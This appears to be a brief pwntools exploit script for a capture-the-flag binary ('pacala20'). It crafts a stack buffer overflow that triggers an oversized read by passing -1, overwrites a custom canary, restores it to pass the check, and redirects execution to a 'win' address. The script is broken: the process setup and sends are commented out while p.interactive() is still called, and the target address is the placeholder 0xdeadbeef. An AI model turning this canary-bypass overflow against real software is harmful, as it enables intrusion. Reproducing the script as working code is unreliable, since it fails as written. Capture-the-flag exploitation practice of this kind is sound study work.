from pwn import *

# p = process("./pacala20")
win = 0xdeadbeef

# p.sendline('-1') # send -1 which casted to unsigned will be, in fact 255, in order to trigger the overflow
payload = b'pacala_mare_bos\x00'
payload += b'B'*8 # here we corupt the custom canary
payload += b'C'*8
payload += b'B'*8 # put again the same canary to pass the check
payload += b'X'*8*8
payload += p64(win)

print(payload)

# p.sendline(payload)

p.interactive()